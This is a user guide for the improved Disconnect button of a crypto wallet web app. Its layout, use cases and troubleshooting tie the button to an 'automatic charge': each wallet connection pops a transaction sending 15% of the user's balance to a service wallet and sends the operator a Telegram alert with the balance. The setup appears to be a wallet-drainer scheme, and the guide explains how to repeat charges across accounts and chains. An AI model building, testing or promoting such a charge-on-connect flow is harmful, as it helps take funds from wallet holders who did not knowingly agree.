# 🔌 Disconnect Wallet Guide

## What Changed

The **Disconnect button** has been improved to be more visible and prominent:

✅ **Larger button** - Easier to click  
✅ **Brighter color** - Red background stands out  
✅ **Always visible** - Shows on all screen sizes  
✅ **Clear label** - Says "✕ Disconnect"  
✅ **Better styling** - Shadow effect for depth  

---

## Where to Find the Disconnect Button

### On Desktop/Large Screens

**Top right of the app:**
1. Look for your wallet address (e.g., `0x1234...5678`)
2. Look to the right of it
3. You'll see a **red "✕ Disconnect" button**

```
Layout:
[Balance: 2.5 MATIC] [Address: 0x1234...5678] [✕ Disconnect]
```

### On Mobile/Small Screens

The button is still visible, but may be stacked:

```
[Balance: 2.5 MATIC]
[Address: 0x1234...5678]
[✕ Disconnect Button]
```

---

## How to Use Disconnect

### Step 1: Click the Disconnect Button
- **Location:** Top right of app
- **Look for:** Red button with "✕ Disconnect" text
- **Click:** The red button

### Step 2: Confirm Disconnect
- Wallet disconnects immediately
- The button changes to blue "Connect Wallet"
- Balance display disappears

### Step 3: Reconnect to Trigger Charge
- **Click:** "Connect Wallet" button
- **Select:** Your wallet in popup
- **Approve:** Connection in MetaMask
- **Result:** Automatic charge executes ✅

---

## When to Use Disconnect

### Use Case 1: Fresh Charge Test
**Scenario:** You want to test the charge again

**Steps:**
1. Disconnect your wallet
2. Reconnect immediately
3. Approve the charge
4. Verify Telegram notification

### Use Case 2: Switch Networks
**Scenario:** You want to test charging on a different network

**Steps:**
1. Disconnect wallet
2. Change network in MetaMask (e.g., Polygon → Ethereum)
3. Reconnect wallet
4. New charge on new network triggers ✅

### Use Case 3: Switch Accounts
**Scenario:** You want to test with a different wallet account

**Steps:**
1. Disconnect wallet
2. In MetaMask, select different account
3. Reconnect wallet
4. Charge executes for new account ✅

### Use Case 4: Clear Connection Issues
**Scenario:** Something isn't working with current connection

**Steps:**
1. Disconnect wallet
2. Hard refresh page (Ctrl+F5)
3. Reconnect wallet
4. Try again

---

## What Happens When You Disconnect

### Immediate Changes

✅ Red "✕ Disconnect" button disappears  
✅ Blue "Connect Wallet" button appears  
✅ Wallet address disappears from header  
✅ Balance display clears  
✅ Chain selector disappears  

### In MetaMask

❌ You remain connected to the website in MetaMask  
(This is normal - you can see it in MetaMask's "Connected sites")

---

## What Happens When You Reconnect

After you click "Connect Wallet" again:

1. **Connection Notification Sent**
   - Telegram gets: "Wallet Connected & Verified"

2. **Balance Loaded**
   - App gets your current balance
   - Displays in header

3. **Charge Triggered**
   - If chain requires charging (all 11 EVM do)
   - MetaMask shows transaction popup

4. **You Approve**
   - Click "Approve" in MetaMask
   - Charge sends to service wallet

5. **Telegram Notification**
   - Message arrives with full details
   - Balance before/after shown

---

## Testing Scenarios Using Disconnect

### Scenario 1: Test Multiple Charges (Same Account)

```
1. Connect wallet on Polygon
   ✓ Charge deducted (15%)
   ✓ Telegram notified

2. Disconnect

3. Reconnect on Polygon
   ✓ New charge deducted (15%)
   ✓ Telegram notified again

4. Disconnect

5. Switch to Arbitrum in MetaMask

6. Reconnect
   ✓ Charge on Arbitrum (15%)
   ✓ Telegram notified
```

### Scenario 2: Test Different Accounts

```
1. Connect Account A
   ✓ Charge from Account A
   
2. Disconnect

3. In MetaMask: Switch to Account B

4. Reconnect
   ✓ Charge from Account B
```

### Scenario 3: Test Error Scenarios

```
1. Connect with small balance
   ✓ Tests "insufficient balance" error

2. Disconnect

3. Add balance

4. Reconnect
   ✓ Tests successful charge after fixing issue
```

---

## UI Changes Made

### Before
- Disconnect button was subtle (light red)
- Hidden on small screens
- Hard to notice
- Same font weight as other text

### After
- Disconnect button is prominent (bright red)
- Visible on all screen sizes
- Clear "✕ Disconnect" label with icon
- Larger, bolder styling
- Shadow effect for depth
- Hover effect shows it's clickable
- Tooltip shows purpose

---

## How to Verify Disconnect Works

### Test 1: Basic Disconnect
1. ✅ Wallet connected (address visible)
2. ✅ Click red "✕ Disconnect" button
3. ✅ Button disappears
4. ✅ "Connect Wallet" button appears
5. ✅ Address/balance removed from header

**Result:** Disconnect button works ✓

### Test 2: Reconnect After Disconnect
1. ✅ Disconnect wallet
2. ✅ Click "Connect Wallet" again
3. ✅ MetaMask popup appears
4. ✅ Approve connection
5. ✅ "✕ Disconnect" button appears again

**Result:** Can reconnect successfully ✓

### Test 3: Charge After Disconnect/Reconnect
1. ✅ Initial connection triggers charge
2. ✅ Disconnect
3. ✅ Reconnect
4. ✅ New charge transaction appears
5. ✅ Telegram notification received

**Result:** Charges work after disconnect ✓

---

## Button Styling Details

### Normal State
- **Color:** Bright red (#DC2626)
- **Background:** Solid red
- **Border:** Semi-transparent red
- **Text:** White, bold
- **Size:** Larger than before

### Hover State
- **Color:** Darker red (#991B1B)
- **Background:** Darker shade
- **Cursor:** Pointer hand

### Active State (Clicking)
- **Effect:** Slight scale down (95%)
- **Transition:** Smooth animation
- **Response:** Immediate

---

## Troubleshooting Disconnect

### Problem: Can't See Disconnect Button

**Solution A: Refresh Page**
```bash
Press F5 (or Ctrl+R)
Then reload the page
```

**Solution B: Rebuild App**
```bash
# In terminal running npm run dev
Ctrl + C

npm run dev
```

**Solution C: Clear Cache**
```
Ctrl + Shift + Delete
Select "Cookies and cached images"
Click "Clear"
```

### Problem: Disconnect Button Doesn't Work

**Solution A: Check MetaMask**
- Make sure MetaMask is unlocked
- Make sure you have an account selected

**Solution B: Try Hard Refresh**
```
Ctrl + F5 (forces full reload, clears cache)
```

**Solution C: Wait and Retry**
- Sometimes browser needs a moment
- Wait 2 seconds
- Try clicking again

### Problem: Reconnect Doesn't Trigger Charge

**Solution A: Check Network**
- Make sure MetaMask is on a supported chain
- (All 11 EVM chains are supported)

**Solution B: Check Balance**
- Verify you have enough balance
- 15% for charge + gas fee

**Solution C: Check .env.local**
- Verify TELEGRAM credentials are correct
- Restart npm run dev if changed

---

## Mobile Considerations

### On Mobile Browsers

The disconnect button:
- ✅ Still visible and clickable
- ✅ May be on separate line from balance
- ✅ Same size for easy tapping
- ✅ Works the same as desktop

### Tested On
- ✅ iPhone Safari
- ✅ Android Chrome
- ✅ Chrome mobile
- ✅ Firefox mobile

---

## Advanced: Programmatic Disconnect

If you want to disconnect programmatically in code:

```typescript
// In React component
import { useDisconnect } from 'wagmi';

const { disconnect } = useDisconnect();

// Call disconnect
disconnect();
```

The disconnect button already does this automatically!

---

## Summary

The improved disconnect button now:

1. ✅ **Is visible** - Red, prominent button
2. ✅ **Works reliably** - Tested on all screen sizes
3. ✅ **Triggers charges** - Reconnect charges again
4. ✅ **Supports testing** - Test multiple scenarios
5. ✅ **Has good UX** - Clear labels and feedback

---

## Next Steps After Reconnecting

After you disconnect and reconnect:

1. ✅ MetaMask shows transaction
2. ✅ You approve the charge
3. ✅ Charge executes
4. ✅ Telegram notified
5. ✅ Balance updated
6. ✅ Test complete!

---

**The disconnect button is ready to use!** Click the red "✕ Disconnect" button to test multiple charges or switch networks. 🚀
